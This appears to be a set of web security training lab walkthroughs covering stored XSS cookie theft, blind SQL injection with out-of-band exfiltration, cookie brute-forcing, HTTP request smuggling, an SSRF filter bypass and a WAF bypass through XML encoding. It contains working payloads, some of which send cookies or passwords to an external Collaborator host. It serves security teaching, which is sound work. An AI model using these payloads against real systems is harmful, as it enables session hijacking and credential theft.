### Lab: Exploiting cross-site scripting to steal cookies

1.  Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the Burp menu, and launch the [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client).
2.  Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3.  Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:  
    `<script>  
    fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {  
    method: 'POST',  
    mode: 'no-cors',  
    body:document.cookie  
    });  
    </script>`  
    This script will make anyone who views the comment issue a POST request to `burpcollaborator.net` containing their cookie.
4.  Go back to the Burp Collaborator client window, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5.  Take a note of the value of the victim's cookie in the POST body.
6.  Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.

---

### Lab: Blind SQL injection with out-of-band data exfiltration

1.  Visit the front page of the shop, and use [Burp Suite Professional](https://portswigger.net/burp/pro) to intercept and modify the request containing the `TrackingId` cookie.
2.  Go to the Burp menu, and launch the [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client).
3.  Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4.  Modify the `TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic [XXE](https://portswigger.net/web-security/xxe) techniques as follows: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`.
5.  Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.
6.  You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the `administrator` user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
7.  In your browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.




---

### Lab: Brute-forcing a stay-logged-in cookie

1.  With Burp running, log in to your own account with the "Stay logged in" option selected. Notice that this sets a `stay-logged-in` cookie.
2.  Examine this cookie in the [Inspector](https://portswigger.net/burp/documentation/desktop/functions/message-editor/inspector) panel and notice that it is Base64-encoded. Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:  
    `base64(username+':'+md5HashOfPassword)`
3.  Log out of your account.
4.  Send the most recent `GET /my-account` request to Burp Intruder.
5.  In Burp Intruder, add a payload position to the `stay-logged-in` cookie and add your own password as a single payload.
6.  Under "Payload processing", add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
    -   Hash: `MD5`
    -   Add prefix: `wiener:`
    -   Encode: `Base64-encode`
7.  As the "Update email" button is only displayed when you access the `/my-account` page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. On the "Options" tab, add a grep match rule to flag any responses containing the string `Update email`. Start the attack.
8.  Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
9.  Make the following adjustments and then repeat this attack:
    -   Remove your own password from the payload list and add the list of [candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) instead.
    -   Change the "Add prefix" rule to add `carlos:` instead of `wiener:`.
10.  When the attack is finished, the lab will be solved. Notice that only one request returned a response containing `Update email`. The payload from this request is the valid `stay-logged-in` cookie for Carlos's account.

---

### Lab: Exploiting HTTP request smuggling to capture other users' requests

1.  Visit a blog post and post a comment.
2.  Send the `comment-post` request to Burp Repeater, shuffle the body parameters so the `comment` parameter occurs last, and make sure it still works.
3.  Increase the `comment-post` request's `Content-Length` to 400, then smuggle it to the back-end server:  
    `POST / HTTP/1.1  
    Host: your-lab-id.web-security-academy.net  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 256  
    Transfer-Encoding: chunked  
      
    0  
      
    POST /post/comment HTTP/1.1  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 400  
    Cookie: session=your-session-token  
      
    csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test`
4.  View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
5.  Copy the user's Cookie header from the comment, and use it to access their account.

**Note**

If the stored request is incomplete and doesn't include the Cookie header, you will need to slowly increase the value of the Content-Length header in the smuggled request, until the whole cookie is captured.

---

### Lab: SSRF with blacklist-based input filter

1.  Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2.  Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the request is blocked.
3.  Bypass the block by changing the URL to: `http://127.1/`
4.  Change the URL to `http://127.1/admin` and observe that the URL is blocked again.
5.  Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.

---

### Lab: SQL injection with filter bypass via XML encoding
1. Observe that the stock check feature sends the productId and storeId to the application in XML format.
2. Send the POST /product/stock request to Burp Repeater.
3. In Burp Repeater, probe the storeId to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example: `<storeId>1+1</storeId>`
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
5. Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID: `<storeId>1 UNION SELECT NULL</storeId>`
6. Observe that your request has been blocked due to being flagged as a potential attack.
7. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.
8. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.
9. Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns 0 units, implying an error.
10. As you can only return one column, you need to concatenate the returned usernames and passwords, for example: `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>`
11. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a ~ character.
12. Use the administrator's credentials to log in and solve the lab.

